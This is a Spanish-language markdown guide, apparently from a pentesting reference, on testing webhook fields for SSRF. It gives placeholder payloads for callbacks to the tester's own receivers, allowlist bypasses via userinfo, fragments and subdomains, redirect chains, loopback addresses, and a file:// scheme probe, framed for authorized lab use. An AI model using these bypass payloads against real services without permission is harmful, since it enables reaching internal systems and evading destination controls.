# 🗡️ SSRF mediante webhooks: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Callbacks HTTP(S) a receptores propios

```text
https://{RECEPTOR_PROPIO}/webhook/{NONCE}
https://{NONCE}.{RECEPTOR_DNS_PROPIO}/event
https://{RECEPTOR_PROPIO}:8443/event/{NONCE}
```

**Cuándo usarlo:** Registrar método, IP y redirección. Un webhook esperado no es SSRF sin violación de la política de destino.

**Fuente:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa7-server-side-request-forgery/).


### Campos donde suele viajar la URL

```text
{"callbackUrl":"https://{RECEPTOR_PROPIO}/event/{NONCE}"}
{"url":"https://{RECEPTOR_PROPIO}/event/{NONCE}"}
{"delivery":{"target":"https://{RECEPTOR_PROPIO}/event/{NONCE}"}}
```

**Cuándo usarlo:** Cada línea es alternativa. Usar solo un campo que la API documente/acepte.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/ssrf/blind).


## 🧭 Payloads por contexto

### Userinfo, fragmento y puerto

```text
https://{HOST_PERMITIDO}@{RECEPTOR_PROPIO}/event/{NONCE}
https://{RECEPTOR_PROPIO}/event/{NONCE}#{HOST_PERMITIDO}
https://{HOST_PERMITIDO}.{RECEPTOR_DNS_PROPIO}/event/{NONCE}
```

**Cuándo usarlo:** Alternativas de parser: userinfo, fragmento y subdominio bajo DNS propio. Confirmar el host efectivo y la regla de allowlist.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/ssrf).


## 🔥 Payloads avanzados

### Redirección entre receptores propios

```text
https://{RECEPTOR_PROPIO}/redirect302?to=https://{SEGUNDO_RECEPTOR_PROPIO}/final/{NONCE}
https://{RECEPTOR_PROPIO}/redirect307?to=https://{SEGUNDO_RECEPTOR_PROPIO}/final/{NONCE}
```

**Cuándo usarlo:** Configurar ambos redirectores en el receptor propio y enviar solo una URL por prueba. Verificar si el cliente HTTP sigue 302 o 307 y revalida el destino final.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/ssrf).


### Loopback solo en laboratorio propio

```text
http://127.0.0.1:{PUERTO_CANARY_LAB}/health
http://127.1:{PUERTO_CANARY_LAB}/health
```

**Cuándo usarlo:** Ambas direcciones llegan a loopback en el host que hace la solicitud, no al equipo del consultor. Solo usar con listener canario controlado en ese mismo entorno de laboratorio y alcance explícito.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/ssrf).


## 🔬 Pruebas guiadas por escenario

### 1. Callback HTTPS controlado

**Objetivo:** Confirmar si el servicio solicita la URL configurada.

```json
{"callbackUrl":"https://{RECEPTOR_PROPIO}/webhook/{NONCE}"}
```

**Interpretación:** Un callback esperado no es SSRF. Anotar método, cabeceras y origen de conexión sin guardar secretos.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa7-server-side-request-forgery/).

### 2. URL en parámetro alterno

**Objetivo:** Comprobar si un parámetro de prueba inicia una segunda solicitud servidor.

```http
POST /api/v1/webhooks/test?url=https%3A%2F%2F{RECEPTOR_PROPIO}%2Falt%2F{NONCE} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
```

**Interpretación:** Solo usar el parámetro si existe. Un DNS aislado sin HTTP no prueba acceso a recursos internos.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/ssrf/blind).

### 3. Redirección a segundo host propio

**Objetivo:** Determinar si se sigue un 302 y se revalida el destino.

```text
callbackUrl = https://{RECEPTOR_PROPIO}/redir/{NONCE}
302 Location: https://{SEGUNDO_RECEPTOR_PROPIO}/final/{NONCE}
```

**Interpretación:** Ambos destinos bajo control y dentro del alcance. Seguir 302 puede ser funcionalidad esperada; evaluar política.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/ssrf).

### 4. Esquema no permitido

**Objetivo:** Confirmar que solo se aceptan esquemas HTTP(S).

```json
{"callbackUrl":"file:///tmp/canary-propio.txt"}
```

**Interpretación:** No leer archivos sensibles; rechazo de file: confirma una validación concreta, no todas las rutas SSRF.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa7-server-side-request-forgery/).

### 5. Loopback de laboratorio

**Objetivo:** Probar bloqueo de destinos locales sin usar servicios de terceros.

```json
{"callbackUrl":"http://127.0.0.1:{PUERTO_CANARY_LAB}/health"}
```

**Interpretación:** Solo en laboratorio o entorno propio con servicio canary. No explorar puertos internos ajenos.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/ssrf).

### 6. Destino en campo anidado

**Objetivo:** Comprobar validación también cuando la URL está en un objeto de eventos.

```json
{"event":"canary","delivery":{"target":"https://{RECEPTOR_PROPIO}/nested/{NONCE}"}}
```

**Interpretación:** Usar únicamente si el esquema acepta delivery.target; comparar con callbackUrl legítimo.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa7-server-side-request-forgery/).

### 7. Host permitido en userinfo

**Objetivo:** Probar un validador que compara texto antes de @ en lugar del host efectivo.

```json
{"callbackUrl":"https://{HOST_PERMITIDO}@{RECEPTOR_PROPIO}/userinfo/{NONCE}"}
```

**Interpretación:** El host final debe ser el receptor propio. Solo hay bypass si la política autorizaba el primero y la solicitud llegó al segundo.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/ssrf).

### 8. Host permitido en fragmento

**Objetivo:** Probar filtro que busca el nombre permitido en toda la URL.

```json
{"callbackUrl":"https://{RECEPTOR_PROPIO}/fragmento/{NONCE}#{HOST_PERMITIDO}"}
```

**Interpretación:** El fragmento no viaja en HTTP; confirmar solicitud al receptor propio y elude la política solo si el destino estaba prohibido.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/ssrf).

### 9. Subdominio DNS único

**Objetivo:** Correlacionar resolución ciega desde un webhook de prueba.

```json
{"callbackUrl":"https://{NONCE}.{RECEPTOR_PROPIO}/event"}
```

**Interpretación:** DNS por sí solo no prueba conexión HTTP ni acceso interno; observar un evento en receptor propio.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/ssrf/blind).

### 10. Loopback abreviado en laboratorio

**Objetivo:** Comprobar filtro de destino para 127.1 si el parser lo admite.

```json
{"callbackUrl":"http://127.1:{PUERTO_CANARY_LAB}/health"}
```

**Interpretación:** Solo en laboratorio con listener propio. Registrar IP final; no explorar redes internas.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/ssrf).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
